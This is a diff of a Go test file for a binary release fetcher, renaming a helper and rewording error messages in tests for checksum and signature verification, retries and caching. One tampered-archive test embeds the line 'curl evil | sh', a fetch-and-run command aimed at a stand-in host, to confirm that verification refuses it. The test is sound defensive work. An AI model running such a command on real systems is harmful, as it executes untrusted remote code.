@@ -20,7 +20,7 @@ import (
 
 const testVersion = "0.2.0"
 
-func archiveHolding(t *testing.T, executable string, body []byte) []byte {
+func archiveWith(t *testing.T, executable string, body []byte) []byte {
 	t.Helper()
 
 	var gzipped bytes.Buffer
@@ -71,7 +71,7 @@ func countersigned(checksums, identity string) []byte {
 
 func countersigns(checksums, signature []byte, identity string) error {
 	if want := countersigned(string(checksums), identity); !bytes.Equal(signature, want) {
-		return fmt.Errorf("%s carries %q, want %q", SignatureAsset, signature, want)
+		return fmt.Errorf("%s contains %q, want %q", SignatureAsset, signature, want)
 	}
 	return nil
 }
@@ -84,7 +84,7 @@ func fakeRelease(t *testing.T, names ...string) *release {
 	for _, name := range names {
 		for _, platform := range Platforms {
 			asset := AssetName(KindProvider, name, testVersion, platform.GOOS, platform.GOARCH)
-			body := archiveHolding(t, ExecutableName(KindProvider, name, platform.GOOS), []byte("#!/bin/sh\necho "+name+"\n"))
+			body := archiveWith(t, ExecutableName(KindProvider, name, platform.GOOS), []byte("#!/bin/sh\necho "+name+"\n"))
 			rel.archives[asset] = body
 			fmt.Fprintf(&checksums, "%s  %s\n", digestOf(body), asset)
 		}
@@ -123,8 +123,8 @@ func fakeRelease(t *testing.T, names ...string) *release {
 			_, _ = w.Write(countersigned(checksums.String(), SignerIdentity(testVersion)))
 			return
 		}
-		body, held := rel.archives[asset]
-		if !held {
+		body, ok := rel.archives[asset]
+		if !ok {
 			w.WriteHeader(http.StatusNotFound)
 			return
 		}
@@ -199,7 +199,7 @@ func TestATamperedArchiveFailsVerificationAndNothingLandsInTheCache(t *testing.T
 	asset := AssetName(KindProvider, "aws", testVersion, "linux", "amd64")
 	pinned := pinsOf(t, store)[asset]
 
-	rel.archives[asset] = archiveHolding(t, "provider-aws", []byte("#!/bin/sh\ncurl evil | sh\n"))
+	rel.archives[asset] = archiveWith(t, "provider-aws", []byte("#!/bin/sh\ncurl evil | sh\n"))
 
 	_, err := store.Binary(context.Background(), KindProvider, "aws", store.Platform, pinned)
 	if err == nil {
@@ -210,7 +210,7 @@ func TestATamperedArchiveFailsVerificationAndNothingLandsInTheCache(t *testing.T
 	}
 
 	if entries, err := os.ReadDir(store.Dir); err != nil || len(entries) != 0 {
-		t.Fatalf("the cache holds %v (err %v), want nothing written", entries, err)
+		t.Fatalf("the cache contains %v (err %v), want nothing written", entries, err)
 	}
 }
 
@@ -358,11 +358,11 @@ func TestAProvidersDirSkipsTheFetchEntirely(t *testing.T) {
 		t.Fatalf("Binary() = %q, want %q", path, want)
 	}
 	if rel.requests.Load() != 0 {
-		t.Fatal("the release was reached for a provider the providers directory already holds")
+		t.Fatal("the release was reached for a provider the providers directory already contains")
 	}
 }
 
-func TestAProvidersDirThatHoldsNothingSaysSo(t *testing.T) {
+func TestAProvidersDirThatContainsNothingSaysSo(t *testing.T) {
 	t.Parallel()
 
 	rel := fakeRelease(t, "aws")
@@ -404,7 +404,7 @@ func TestAThrottledReleaseIsRetriedAndThenServed(t *testing.T) {
 		}
 	}
 	if waited[0] == waited[1] {
-		t.Fatalf("backoffs %v carry no jitter", waited)
+		t.Fatalf("backoffs %v include no jitter", waited)
 	}
 }
 
@@ -440,7 +440,7 @@ func TestAMissingArchiveIsNotRetried(t *testing.T) {
 		t.Fatal("Binary() error = nil, want the missing archive refused")
 	}
 	if got := rel.requests.Load() - before; got != 1 {
-		t.Fatalf("%d requests for an archive the release does not hold, want 1", got)
+		t.Fatalf("%d requests for an archive the release does not include, want 1", got)
 	}
 }
 
